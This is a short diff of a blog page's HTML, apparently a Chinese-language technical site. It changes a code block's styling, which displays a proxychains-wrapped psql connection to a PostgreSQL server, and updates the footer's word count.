-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains psql -h 172.56.102.3 -p <span style="color:#ae81ff">5432</span> -U postgres
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains psql -h 172.56.102.3 -p <span style="color:#ae81ff">5432</span> -U postgres
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> l1uyun: 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -1049,7 +1049,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 129194 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 129185 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
